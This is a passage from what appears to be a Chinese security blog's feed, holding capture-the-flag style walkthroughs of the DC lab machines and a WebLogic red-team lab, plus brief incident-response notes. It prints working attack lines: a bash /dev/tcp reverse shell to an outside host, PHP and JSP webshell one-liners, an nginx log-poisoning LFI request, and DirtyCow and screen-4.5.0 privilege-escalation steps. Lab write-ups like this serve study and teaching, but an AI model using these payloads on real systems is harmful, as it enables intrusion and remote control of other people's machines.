#__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724144058091.png" alt="image-20230724144058091" /></p><p>跟上面得到的一样</p><h2 id="joomla后台shell"><a class="markdownIt-Anchor" href="#joomla后台shell"></a> Joomla后台shell</h2><p><a href="https://blog.csdn.net/qq_42084004/article/details/118971341">https://blog.csdn.net/qq_42084004/article/details/118971341</a></p><ol><li><p>官网下载joomla中文包com_zmaxappstore.zip，解压修改install.xml 添加<code>&lt;filename&gt;&gt;test.php&lt;/filename&gt; </code>将test.php放到admin文件夹内，重新打包zip，后台操作<code>Extensions–&gt; install–&gt;upload package file</code></p><p><code>shell_url:/administrator/components/&#123;zip包名&#125;/da.php</code></p></li><li><p>后台操作 <code>Global Configuration- -&gt;media–&gt;Legal Extensions (File Types)</code>添加php后缀，媒体上传即可</p></li><li><p>后台操作 <code>Extensions–&gt;Templates–&gt;Templates–&gt;xxx Details and Files</code>修改error.php文件 添加shell代码，save保存，<code>shell_url:/administrator/templates/xxx/error.php</code></p></li></ol><p>选择第二种</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724144457393.png" alt="image-20230724144457393" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724145014056.png" alt="image-20230724145014056" /></p><p>上传了却不通过。emmm，换另一种，第三种。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724145546923.png" alt="image-20230724145546923" /></p><p>写好了访问shell，第三种失败，因为看不到对应的template，失败。</p><p>于是用第一种，包中要改的文件名是<code>zmaxappstore.xml</code>而非上面所说，而且对应的拓展名并不是包的命名，需要自己去看，上传应用成功，上线冰蝎。地址：<code>http://10.131.210.58/administrator/components/com_zmaxappstore/shell.php</code></p><p>对于写shell：国外喜欢用反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.0.114/4444 0&gt;&amp;1&#x27; &quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>而不是webshell</p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p>信息搜集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#whoami</span><br><span class="line">www-data</span><br><span class="line">#id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">#/etc/passwd</span><br><span class="line">mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">messagebus:x:108:112::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:109:113::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">dc3:x:1000:1000:dc3,,,:/home/dc3:/bin/bash</span><br><span class="line">#find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.16(可以sudo提权，测试cmd：sudo -u#4294967295 id -u，不行就走)</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line">4.4.0-21-generic（可以脏牛，但是发现不行，因为个g++环境出错）</span><br><span class="line"></span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS（好像有漏洞）</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br></pre></td></tr></table></figure><p>根据上面给出的信息，上传脏牛到tmp文件夹，<a href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8Cmake%E4%B8%80%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%60./dcow%60%EF%BC%8C%E5%BD%93%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E6%96%87%E4%BB%B6%60ssh_bak%60%EF%BC%8C%E9%82%A3%E5%B0%B1%E6%98%AF%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%EF%BC%9A%60dirtyCowFun%60%EF%BC%8C%E8%87%AA%E8%A1%8C%60su%60%E5%B0%B1%E5%A5%BD%E4%BA%86%E3%80%82%E5%AE%8C%E6%88%90%EF%BC%9A">https://github.com/gbonacini/CVE-2016-5195，make一下，然后使用`./dcow`，当我们看到文件`ssh_bak`，那就是成功了，默认密码：`dirtyCowFun`，自行`su`就好了。完成：</a></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801135423488.png" alt="image-20230801135423488" /></p><h1 id="dc5"><a class="markdownIt-Anchor" href="#dc5"></a> DC5</h1><p>发现ip 10.131.210.157，开启了80和111端口，查看80端口，发现啥也没，只有contact us可以试一下了，无论怎么输入东西，都会重定向到thankyou.php。于是扫个目录</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801151301047.png" alt="image-20230801151301047" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801145837864.png" alt="image-20230801145837864" /></p><p>发现footer.php，就一个footer还要php？html不香吗？</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150116897.png" alt="image-20230801150116897" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150343116.png" alt="image-20230801150343116" /></p><p>发现端倪，这个footer.php还会变？重复访问footer.php，确实会变，所以，这个网页引用了文件footer.php，盲猜LFI，而且参数为<code>file</code>，试一下，成功！</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150536236.png" alt="image-20230801150536236" /></p><p>接下来就看有没有什么重要的文件（例如密码文件/ssh密钥/历史命令/邮件信息/操作记录等），一般有：</p><table><thead><tr><th>位置</th><th>描述</th></tr></thead><tbody><tr><td>/etc/issue</td><td>包含要在登录提示之前打印的消息或系统标识。</td></tr><tr><td>/etc/profile</td><td>控制系统范围的默认变量，例如导出（Export）变量、文件创建掩码 (umask)、终端类型、用于指示新邮件何时到达的邮件消息</td></tr><tr><td>/proc/version</td><td>指定 Linux 内核的版本</td></tr><tr><td>/etc/passwd</td><td>包含有权访问系统的所有注册用户信息</td></tr><tr><td>/etc/shadow</td><td>包含系统用户密码的信息</td></tr><tr><td>/root/.bash_history</td><td>包含 root 用户的历史命令</td></tr><tr><td>/var/log/dmessage</td><td>包含全局系统消息，包括系统启动期间记录的消息</td></tr><tr><td>/var/mail/root</td><td>root 用户的所有电子邮件</td></tr><tr><td>/root/.ssh/id_rsa</td><td>服务器上的root 用户或任何已知有效用户的 SSH 私钥</td></tr><tr><td>/var/log/apache2/access.log</td><td>Apache web服务器的访问请求</td></tr><tr><td>/var/log/nginx/access.log</td><td></td></tr><tr><td>/var/log/nginx/error.log</td><td></td></tr></tbody></table><p>由于这个靶机没有ssh，我也懒得弄，还有这个靶机是nginx的，所以看看有没有他的log。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801151413780.png" alt="image-20230801151413780" /></p><p>还真有，而且它会记录传输的URL，构造一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt; HTTP/1.1</span><br><span class="line">Host: 10.131.210.157</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>因为这个一般会返回错误，所以查看error.log</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155120497.png" alt="image-20230801155120497" /></p><p>发现这个webshell用不了的，蚁剑死活连不上，那就直接反弹shell把。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155404314.png" alt="image-20230801155404314" /></p><p>成功</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155737701.png" alt="image-20230801155737701" /></p><p>还是msf用起来舒服。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801160134357.png" alt="image-20230801160134357" /></p><p>脏牛提权失败</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162038062.png" alt="image-20230801162038062" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure><p>发现奇怪的东西：<strong>/bin/screen-4.5.0</strong></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162544216.png" alt="image-20230801162544216" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162859923.png" alt="image-20230801162859923" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162846831.png" alt="image-20230801162846831" /></p><p>搞定。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801163001555.png" alt="image-20230801163001555" /></p><h1 id="dc6"><a class="markdownIt-Anchor" href="#dc6"></a> DC6</h1><p>扫到一个：10.131.210.60，访问它自动转：<a href="http://wordy/%E3%80%82%E5%88%99%E6%B7%BB%E5%8A%A0host%E3%80%82">http://wordy/。则添加host。</a></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801163748438.png" alt="image-20230801163748438" /></p><p>访问，发现他是wordpress的，wpscan一扫，然后让nmap扫一下，发现22端口（ssh）</p><h1 id="dc7"><a class="markdownIt-Anchor" href="#dc7"></a> DC7</h1><p>扫到192.168.123.44，发现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;dc1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dc1&quot;&gt;&lt;/a&gt; DC1&lt;/h1&gt;
&lt;h2 id=&quot;涉及知识点&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#涉及知识点&quot;&gt;&lt;/a&gt; 涉及知识点&lt;/h2</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计</title>
    <link href="https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-07-10T12:14:58.000Z</published>
    <updated>2023-07-10T12:14:58.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2023-07-05T03:44:45.000Z</published>
    <updated>2023-07-05T03:44:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><h2 id="应急响应"><a class="markdownIt-Anchor" href="#应急响应"></a> 应急响应：</h2><p><strong>分为几个阶段</strong>：</p><p>保护阶段，分析阶段，复现阶段，修复阶段，建议阶段</p><p><strong>目的</strong>：</p><p>分析出攻击时间，攻击操作，攻击后果，安全修复等并给出合理解决方案。</p><p><strong>一般指向：</strong></p><ol><li><p>攻击者可能拿到了哪些权限，攻击可能发生在哪个部分，从最可能的开始排查</p></li><li><p>可疑文件看文件有没有毒，有没有外部链接</p></li><li><p>结合攻击指搭建平台的漏洞</p></li></ol><h2 id="必备知识点"><a class="markdownIt-Anchor" href="#必备知识点"></a> 必备知识点</h2><ol><li>熟悉常见的 WEB 安全攻击技术</li><li>熟悉相关日志启用及存储查看等</li><li>熟悉日志中记录数据分类及分析等</li></ol><h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h2><ol><li>收集目标服务器各类信息</li><li>部署相关分析软件及平台等</li><li>整理相关安全渗透工具指纹库</li><li>针对异常表现第一时间触发思路，从表现预估入侵面及权限面进行排查</li></ol><h2 id="有明确信息网站被入侵"><a class="markdownIt-Anchor" href="#有明确信息网站被入侵"></a> 有明确信息网站被入侵</h2><p>基于时间 基于操作 基于指纹 基于其他</p><h2 id="无明确信息网站被入侵"><a class="markdownIt-Anchor" href="#无明确信息网站被入侵"></a> 无明确信息网站被入侵</h2><ol><li>WEB 漏洞——检查源码类别及漏洞情况</li><li>中间件漏洞——检查对应版本及漏洞情况</li><li>第三方应用漏洞——检查是否存在漏洞应用</li><li>操作系统层面漏洞——检查是否存在系统漏洞</li><li>其他安全问题(口令，后门等)——检查相关应用口令及后门扫描</li></ol><h2 id="常见分析方法"><a class="markdownIt-Anchor" href="#常见分析方法"></a> 常见分析方法</h2><p><strong>指纹库搜索</strong>，<strong>日志时间分析</strong>，<strong>后门追查分析</strong>，<strong>漏洞检查分析等</strong></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><p>发现虚拟机用的是Inter的，我的是锐龙，没办法唤醒，绝了，暂停</p><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1><p><a href="https://www.onlinedown.net/soft/628964.htm">UserAssistView 1.02</a> <a href="https://www.cnblogs.com/xiaozi/p/12679777.html">10款常见的Webshell检测工具</a> <a href="http://www.pc6.com/softview/SoftView_195167.html">PCHunter64</a> <a href="https://github.com/EricZimmerman/AppCompatCacheParser/releases/">https://github.com/EricZimmerman/AppCompatCacheParser/releases/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本概念&quot;&gt;&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;h2 id=&quot;应急响应&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#应急响应&quot;&gt;&lt;/a&gt; 应急响应：&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红队靶场-2</title>
    <link href="https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/"/>
    <id>https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/</id>
    <published>2023-06-30T06:19:36.000Z</published>
    <updated>2023-06-30T06:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><h2 id="主要练习"><a class="markdownIt-Anchor" href="#主要练习"></a> 主要练习</h2><p>Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。</p><ul><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据/白银票据/Sid History/MOF）</li></ul><h2 id="环境设置"><a class="markdownIt-Anchor" href="#环境设置"></a> 环境设置</h2><p>密码统一为：1qaz@WSX</p><p>内网网段：10.10.10.1/24。这个设置NAT网段，所以NAT为10.10.10.0/24</p><p>DMZ网段：10.131.210.1/24。因为用的另一个笔记本进行攻击，所以，使用桥接模式，这个DMZ段的网址是路由器决定的，需要改。</p><p>测试机地址：10.131.210.104（Windows），10.131.210.172（Linux）</p><p>所以这些虚拟机的“外网”IP为：</p><ul><li><p>DC</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012(64)</li><li>应用：AD域</li></ul></li><li><p>WEB</p><ul><li>IP1：10.10.10.80</li><li>IP2：10.131.210.32</li><li>OS：Windows 2008(64)</li><li>应用：Weblogic 10.3.6   MSSQL 2008</li></ul></li><li><p>扫了一遍发现没有开weblogic，那就开一下，进去之后搜索weblogic即可</p></li><li><p>PC</p><ul><li>IP1：10.10.10.201</li><li>IP2：10.131.210.194</li><li>OS：Windows 7(32)</li></ul></li></ul><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/%E6%8B%93%E6%89%91%E5%9B%BE.jpg" alt="img" /></p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p>扫网段就不扫了，我们知道有一个IP，10.131.210.32，发现端口：80、135、139、445、1433、3389、7001、49152、49153、49154、49155、49157、49158。是windows主机</p><h2 id="域信息"><a class="markdownIt-Anchor" href="#域信息"></a> 域信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   Target_Name: DE1AY</span><br><span class="line">|   NetBIOS_Domain_Name: DE1AY</span><br><span class="line">|   NetBIOS_Computer_Name: WEB</span><br><span class="line">|   DNS_Domain_Name: de1ay.com</span><br><span class="line">|   DNS_Computer_Name: WEB.de1ay.com</span><br><span class="line">|   DNS_Tree_Name: de1ay.com</span><br><span class="line">|   Product_Version: 6.1.7601</span><br></pre></td></tr></table></figure><h2 id="mssql的版本"><a class="markdownIt-Anchor" href="#mssql的版本"></a> MSSQL的版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|   name: Microsoft SQL Server 2008 R2 SP2</span><br><span class="line">|   number: 10.50.4000.00</span><br></pre></td></tr></table></figure><h2 id="weblogic版本"><a class="markdownIt-Anchor" href="#weblogic版本"></a> weblogic版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; </span><br></pre></td></tr></table></figure><h2 id="80端口信息"><a class="markdownIt-Anchor" href="#80端口信息"></a> 80端口信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open  http         Microsoft IIS httpd 7.5</span><br></pre></td></tr></table></figure><p>解析漏洞，没有看见网页（上传地址）没办法利用</p><h2 id="服务器信息"><a class="markdownIt-Anchor" href="#服务器信息"></a> 服务器信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows Server 2008 R2 - 2012 </span><br></pre></td></tr></table></figure><h2 id="其他端口信息"><a class="markdownIt-Anchor" href="#其他端口信息"></a> 其他端口信息</h2><p>135 通过135端口入侵实际上是利用RPC漏洞来攻击计算机的。一般情况下135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）</p><p>139 存在Samba服务，可能存在爆破/未授权访问/远程命令执行漏洞。他是NetBIOS Session Service设备提供的辅助端口，是用于提供Windows文件和打印机共享文件的重要连接方式</p><p>445 smb服务，可能存在ms17_010永恒之蓝漏洞。139和445存在，为ipc和smb的利用提供了条件。</p><h2 id="主机信息使用冰蝎看的"><a class="markdownIt-Anchor" href="#主机信息使用冰蝎看的"></a> 主机信息（使用冰蝎看的）</h2><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>主动防御</p><p>SQL Server</p><h3 id="正在运行"><a class="markdownIt-Anchor" href="#正在运行"></a> 正在运行</h3><p>sqlserver weblogic 360</p><h3 id="systeminfo"><a class="markdownIt-Anchor" href="#systeminfo"></a> systeminfo</h3><p>系统：Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601</p><p>名：WEB</p><p>所以搜集到两个网段：</p><ul><li>10.10.10.80</li><li>10.131.210.32</li></ul><p>补丁：</p><ul><li>KB2999226</li><li>KB958488</li><li>KB976902</li></ul><p>域：<a href="http://de1ay.com">de1ay.com</a></p><h1 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> Weblogic</h1><h2 id="weblogic-scan"><a class="markdownIt-Anchor" href="#weblogic-scan"></a> Weblogic scan</h2><p>这里有两个脚本，一个是原始的，不好用，探测不出来：</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><p>一个是修改过的，这个好用：</p><p><a href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p><p>还有个利用工具：</p><p><a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a></p><p>探测到的信息有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Welcome To WeblogicScan !!</span><br><span class="line">[*]开始检测 weblogic-console</span><br><span class="line">[+]The target Weblogic console address is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/console/login/LoginForm.jsp         </span><br><span class="line">[+]Please try weak password blasting!                                         </span><br><span class="line">[+]Weblogic后台路径存在</span><br><span class="line">[*]开始检测 SSRF</span><br><span class="line">[+]The target Weblogic UDDI module is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/uddiexplorer/                       </span><br><span class="line">[+]Please verify the SSRF vulnerability!                                                                            </span><br><span class="line">[+]SSRF 漏洞存在</span><br><span class="line">[*]开始检测 CVE20192725</span><br><span class="line">[-]CVE20192725 未成功检测，请检查网络连接或或目标存在负载中间件</span><br><span class="line">[*]开始检测 CVE20192729</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729</span><br><span class="line">[+]CVE-2019-2729 漏洞存在</span><br><span class="line">[*]开始检测 CVE201710271</span><br><span class="line">[-]Target weblogic not detected CVE-2017-10271</span><br><span class="line">[*]开始检测 CVE20173506</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506</span><br><span class="line">[+]CVE-2017-3506 漏洞存在</span><br></pre></td></tr></table></figure><ul><li><p>CVE-2019-2729 漏洞存在，这个是反序列化漏洞，可以执行RCE</p></li><li><p>CVE-2017-3506 漏洞存在，这个是wls-wsat组件远程命令执行，与2017-10271类似</p></li></ul><h2 id="利用cve-2019-2729"><a class="markdownIt-Anchor" href="#利用cve-2019-2729"></a> 利用CVE-2019-2729</h2><p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~/Mywork/Tools/WeblogicScan/CVE-2019-2729-Exploit]</span><br><span class="line">└─$ python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c chdir</span><br><span class="line">[+] Send Request to : http://10.131.210.32:7001//wls-wsat/CoordinatorPortType</span><br><span class="line">[+] Response : C:\Oracle\Middleware\user_projects\domains\base_domain</span><br></pre></td></tr></table></figure><p>尝试写一个木马进去，或者反弹shell也行。尝试反弹shell不可行，放弃。写一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br></pre></td></tr></table></figure><p>看一下这个weblogic的目录结构，以及把文件放在哪里。经过<code>dir</code>和网上的类似资料，发现放在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 